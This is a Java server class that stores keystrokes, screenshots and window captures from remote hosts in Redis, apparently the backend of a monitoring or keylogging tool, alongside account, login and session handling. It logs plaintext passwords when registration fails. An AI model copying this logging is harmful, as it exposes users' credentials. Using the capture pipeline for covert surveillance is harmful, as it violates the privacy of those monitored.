package com.cserver.shared;

import java.io.File;
import java.security.SecureRandom;
import java.util.ArrayList;
import java.util.List;
import java.util.Set;

import redis.clients.jedis.Jedis;

public class Db {	
	private static final String TAG = "UserDb";
	private Jedis jedis = null;
	private String dbPath = null;
	
	public static final int MAX_CACHE_PICS = 100;
	public static final int REDIS_LRANGE_STEP = 1000;
	
	public static Db getInstance(IDbEnv dbEnv) {
		Db db = new Db();
		if (!db.init(dbEnv.getRedisHost(), dbEnv.getWrkPath()))
			return null;
		return db;
	}
	
	private Db() {
	}

	private boolean init(String redisHost, String dbPath) {
		this.dbPath = dbPath;
		jedis = JedisWrapper.getJedis(redisHost);
		if (jedis == null)
			return false;
		else
			return true;
	}

	public static String getRandomString(int numBytes) {
		SecureRandom random = new SecureRandom();
	    byte bytes[] = new byte[numBytes];
	    random.nextBytes(bytes);
	
	    return Utils.bytesToHex(bytes);
	}

	public DbResult handleKeyBrd(DbHost host, KeyBrdEvent event)
	{
		long keyId = jedis.incr("keyId");
		
		SLogger.d(TAG, "handleKeyBrd event=" + JsonHelper.mapToString(event.toMap()));
		
		jedis.set(host.hostId + ":keyBrdEvent" + keyId, JsonHelper.mapToString(event.toMap()));
		jedis.rpush(host.hostId + ":keyBrdEvents", Long.toString(keyId));
		
		return new DbResult(ClientRequest.STATUS_SUCCESS);
	}
	
	public DbResult handleScreenshot(DbHost host, String sysTime, byte[] data) 
	{	
		long picId = jedis.incr("picId");
		
		if (!host.picsDb.put("screen", picId, data)) {
			SLogger.e(TAG, "put failed");
			return new DbResult(ClientRequest.STATUS_ERROR_SERVER_ERROR);
		}
		
		jedis.set(host.hostId + ":screenshot:" + picId + ":sysTime", sysTime);
		jedis.rpush(host.hostId + ":screenshots", Long.toString(picId));
		
		return new DbResult(ClientRequest.STATUS_SUCCESS);
	}
	
	public DbResult handleUserWindow(DbHost host, String sysTime, byte[] data) 
	{	
		long picId = jedis.incr("picId");
		
		if (!host.picsDb.put("userwindow", picId, data)) {
			SLogger.e(TAG, "put failed");
			return new DbResult(ClientRequest.STATUS_ERROR_SERVER_ERROR);
		}
		
		jedis.set(host.hostId + ":userwindow:" + picId + ":sysTime", sysTime);
		jedis.rpush(host.hostId + ":userwindows", Long.toString(picId));
		
		return new DbResult(ClientRequest.STATUS_SUCCESS);
	}
	
	public String getDbPath() {
		return dbPath;
	}
	
	public Set<String> getHosts(String clientId) { 
		return jedis.smembers("client: "+ clientId + ":hosts");
	}
	
	public List<Long> getHostScreenshots(String hostId, int start, int end) {
		List<String> sList = jedis.lrange(hostId + ":screenshots", start, end);
		List<Long> lList = new ArrayList<Long>();
		
		for (String key : sList) {
			lList.add(Long.parseLong(key));
		}
		
		return lList;
	}
	
	public File getHostScreenshot(DbHost host, long id) {
		return host.picsDb.getObjectFile("screen", id);
	}
	
	public DbHost impersonateHost(String clientId, String hostId, String authId) {
		String uidS = jedis.get("client:" + clientId + ":owner");
		if (uidS == null)
			return null;
		
		String ownerAuthId = jedis.get("uid:" + uidS + ":authId");
		if (ownerAuthId == null || ownerAuthId.isEmpty())
			return null;
		
		if (!ownerAuthId.equals(authId))
			return null;
		
		jedis.sadd("client: "+ clientId + ":hosts", hostId);
		
		DbHost host = new DbHost(this, clientId, hostId);
		
		return host;
	}
	
	public long getNewUserId() {
		return jedis.incr("userid");
	}
	
	public long getNewSessionId() {
		return jedis.incr("sessionid");
	}
	
	public long getNewPurchaseId() {
		return jedis.incr("purchaseid");
	}
	
	public long getNewPurchaseSetId() {
		return jedis.incr("purchaseSetId");
	}
	
	public String createSessionForUser(String uidS) {
		String sname = getRandomString(32);
		if (sname == null) {
			SLogger.e(TAG, "sname not generated");
			return null;
		}
	    
		long sessionId = getNewSessionId();
		String sessionIdS = Long.toString(sessionId);
		
		if (jedis.setnx("sname:"+ sname, Long.toString(sessionId))== 0) {
			SLogger.e(TAG, "sname already exists");
			return null;
		}

	    String oldSessionId = jedis.get("uid:"+ uidS + ":session");
	    if (oldSessionId != null)
	    	userSessionDeleteById(oldSessionId);
	    
		jedis.set("session:"+ sessionIdS + ":uid", uidS);
		jedis.set("session:"+ sessionIdS + ":exptime", "30");
		jedis.set("session:"+ sessionIdS + ":sname", sname);				
		jedis.set("uid:"+ uidS + ":session", sessionIdS);

		return sname;
	}
	
	public String userCheckByNameAndPass(String username, String password) {
		if ((username == null) || (null != UserDataValidator.validateLogin(username)))
			return null;
		
		if ((password == null) || (null != UserDataValidator.validatePass(password)))
			return null;
		
		SLogger.i(TAG, "username=" + username + " login attempt");
		String uidS = jedis.get("username:" + username + ":uid");
		if (uidS == null) {
			SLogger.e(TAG, "username=" + username + " not exits");
			return null;
		}
	    
		String upass = jedis.get("uid:"+ uidS + ":password");
		if (upass == null) {
			SLogger.e(TAG, "uid=" + uidS + " not exits");
			return null;
		}
		
		String uname = jedis.get("uid:"+ uidS + ":username");
		if (uname == null) {
			SLogger.e(TAG, "uid=" + uidS + ":username not exits");
			return null;
		}
		
		if (!uname.equals(username)) {
			SLogger.e(TAG, "invalid name");
			return null;
		}
		
		boolean pwdCheckPassed = false;
		
		try {
			if (!BCrypt.checkpw(password, upass)) {
				SLogger.e(TAG, "invalid password");
				return null;
			}
			pwdCheckPassed = true;
		} catch (Exception e) {
			SLogger.exception(TAG, e);
			SLogger.e(TAG, "BCrypt.checkpw exception=" + e.toString());
		}
		
		return (pwdCheckPassed) ? uidS : null;
	}
	
	public DbResult userAuthByNameAndPass(String username, String password) {
		if ((username == null) || (null != UserDataValidator.validateLogin(username)))
			return new DbResult(Errors.INVALID_REQUEST_PARAMETERS);
		
		if ((password == null) || (null != UserDataValidator.validatePass(password)))
			return new DbResult(Errors.INVALID_REQUEST_PARAMETERS);
		
		String uidS = userCheckByNameAndPass(username, password);
		if (uidS == null) {
			SLogger.e(TAG, "user validation failure");
			return new DbResult(Errors.AUTH_FAILURE);
		}
		
		String sname = createSessionForUser(uidS);
		if (sname == null) {
			SLogger.e(TAG, "session creation failure");
			return new DbResult(Errors.AUTH_FAILURE);
		}
		
		DbUser user = impersonate(sname);
		if (user == null) {
			return new DbResult(Errors.AUTH_FAILURE);
		}
		
		DbResult result = new DbResult(Errors.SUCCESS);
		result.user = user;
		return result;
	}
	
	public void userSessionDelete(String sname) {
		SLogger.i(TAG, "userSessionDelete=" + sname);
		
		String sessionIdS = jedis.get("sname:"+ sname);
		if (sessionIdS == null) 
			return;
		userSessionDeleteById(sessionIdS);
	}
	
	private void userSessionDeleteById(String sessionIdS) {	
		SLogger.i(TAG, "userSessionDeleteById=" + sessionIdS);

		String sname = jedis.get("session:"+ sessionIdS + ":sname");	
		String uidS = jedis.get("session:"+ sessionIdS + ":uid");
		
		if (sname != null)
			jedis.del("sname:"+ sname);
		
		if (uidS != null)
			jedis.del("uid:"+ uidS + ":session");
		
		jedis.del("session:"+ sessionIdS + ":uid");
		jedis.del("session:"+ sessionIdS + ":exptime");
		jedis.del("session:"+ sessionIdS + ":sname");	
	}
	
	
	public int userAccountRegister(String username, String password) {
		SLogger.i(TAG, "userAccountRegister username=" + username);
		
		if ((username == null) || (null != UserDataValidator.validateLogin(username))) {
			SLogger.e(TAG, "invalid username=" + username);
			return Errors.INVALID_REQUEST_PARAMETERS;
		}
		
		if ((password == null) || (null != UserDataValidator.validatePass(password))) {
			SLogger.e(TAG, "invalid password=" + password);
			return Errors.INVALID_REQUEST_PARAMETERS;
		}
		
		if (jedis.get("username:" + username + ":uid") != null) {
			SLogger.e(TAG, "username=" + username + " already exists");
			return Errors.ACCOUNT_ALREADY_REGISTRED;
		}
		
		long uid = getNewUserId();
		String uidS = Long.toString(uid);
		if (jedis.setnx("username:" + username + ":uid", uidS) == 0) {
			SLogger.e(TAG, "userid=" + uid + " already exists");
			return Errors.ACCOUNT_ALREADY_REGISTRED;
		}
		
		boolean clientCreated = false;
		String clientId = null;
		for (int i = 0; i < 100; i++) {
			clientId = getRandomString(16);
			if (0 != jedis.setnx("client:" + clientId + ":owner", uidS)) {
				clientCreated = true;
				break;
			}
		}
		
		if (!clientCreated) {
			jedis.del("username:" + username + ":uid");
			SLogger.e(TAG, "client not created");
			return Errors.ACCOUNT_ALREADY_REGISTRED;
		}
		
		String hashed = BCrypt.hashpw(password, BCrypt.gensalt(12));
		String authId = getRandomString(16);
		jedis.set("uid:"+ uidS + ":password", hashed);
		jedis.set("uid:"+ uidS + ":username", username);
		jedis.set("uid:" + uidS + ":clientId", clientId);
		jedis.set("uid:" + uidS + ":authId", authId);
		
		jedis.rpush("users", uidS);
		jedis.rpush("usernames", username);
		
		SLogger.i(TAG, "userAccountRegister username=" + username + " success");
		
		String sname = createSessionForUser(uidS);
		if (sname == null) {
			SLogger.e(TAG, "session creation failure");
			return Errors.INTERNAL_SERVER_ERROR;
		}
		
		jedis.set("uid:" + uidS + ":active", "1");
		
		return Errors.SUCCESS;
	}
	
	public int logout(DbUser user) {
		SLogger.i(TAG, "logout=" + user.session + " " + user.uidS);
		userSessionDelete(user.session);
		return Errors.SUCCESS;
	}
	
	
	public DbUser impersonate(String session) {
		String uidS = userBySession(session);
		if (uidS == null) {
			SLogger.e(TAG, "session=" + session + " is invalid");
			return null;
		}
		jedis.set("uid:"+ uidS + ":accessTime", Long.toString(System.currentTimeMillis()));
		String username = jedis.get("uid:" + uidS + ":username");
		
		DbUser user = new DbUser(this, uidS, session, username);
		if (!userAccActive(user.uid))
			user.error = Errors.ACCOUNT_NOT_ACTIVE;
		else
			user.error = Errors.SUCCESS;
		
		return user;
	}
	
	public String getClientId(long uid) {
		return jedis.get("uid:" + uid + ":clientId");
	}
	
	public String getAuthId(long uid) {
		return jedis.get("uid:" + uid + ":authId");
	}
	
	public int userAccountDelete(DbUser user, String username, String password) {
		
		SLogger.i(TAG, "userAccountDelete username=" + username);
		
		String uidS = userCheckByNameAndPass(username, password);
		if (uidS == null) {
			return Errors.AUTH_FAILURE;
		}

		if ((user == null) || (!user.uidS.equals(uidS))) {
			return Errors.AUTH_FAILURE;
		}
		
		String sessionIdS = jedis.get("sname:"+ user.session);
		if (sessionIdS == null) {
			SLogger.e(TAG, "sname=" + user.session + " not exists");
			return Errors.INTERNAL_SERVER_ERROR;
		}
		
		String sessionUidS = jedis.get("session:"+ sessionIdS + ":uid");
		if (sessionUidS == null || (!sessionUidS.equals(uidS))) {
			SLogger.e(TAG, "sessionid=" + sessionIdS + " not exists");
			return Errors.INTERNAL_SERVER_ERROR;
		}
		
		String usernameS = jedis.get("uid:"+ uidS + ":username");
		if (!usernameS.equals(username)) {
			SLogger.e(TAG, "invalid usernameS=" + usernameS + " username=" + username);

			return Errors.INTERNAL_SERVER_ERROR;
		}

		long uid = Long.parseLong(uidS);
		
		jedis.set("uid:" + uidS + ":active", "0");
		
		jedis.lrem("users", 0, uidS);
		jedis.lrem("usernames", 0, usernameS);
		userSessionDeleteById(sessionIdS);
		
	
		jedis.del("uid:"+ uidS + ":username");
		jedis.del("uid:"+ uidS + ":session"); 
		jedis.del("uid:"+ uidS + ":password"); 
		jedis.del("uid:"+ uidS + ":ioreqs");
		jedis.del("uid:"+ uidS + ":date");
		jedis.del("uid:"+ uidS + ":admob");
		jedis.del("uid:" + uidS + ":accessTime");
		jedis.del("uid:" + uidS + ":currPublicKeyId");
		jedis.del("uid:"+ uidS + ":clientId");
		jedis.del("uid:"+ uidS + ":authId");
		
		jedis.del("uid:" + uidS + ":friends");
		jedis.del("uid:" + uidS + ":friendsSet");
		
		jedis.del("uid:" + uidS + ":invites");
		
		jedis.del("uid:" + uidS + ":age");
		
		jedis.del("uid:" + uidS + ":gender");
		jedis.del("uid:" + uidS + ":job");
		jedis.del("uid:" + uidS + ":jobTitle");
		jedis.del("uid:" + uidS + ":school");
		jedis.del("uid:" + uidS + ":interests");
		jedis.del("uid:" + uidS + ":hobby");
		jedis.del("uid:" + uidS + ":aboutMe");
		
	
		jedis.del("username:" + usernameS + ":uid");
		
		
		SLogger.i(TAG, "userAccountDelete username=" + username + " successful");
		return Errors.SUCCESS;
	}
	
	private String userBySession(String sname) {
		if (sname == null)
			return null;
		
		String sessionIdS = jedis.get("sname:"+ sname);
		if (sessionIdS == null)  {
			SLogger.i(TAG, "no session by sname=" + sname);
			return null;
		}
		
		return jedis.get("session:"+ sessionIdS + ":uid");
	}
	
	public boolean userAccActive(long uid) {
		String activeS = jedis.get("uid:" + uid + ":active");
		if (activeS == null)
			return false;
		
		return (Long.parseLong(activeS) > 0) ? true : false;		
	}	
}

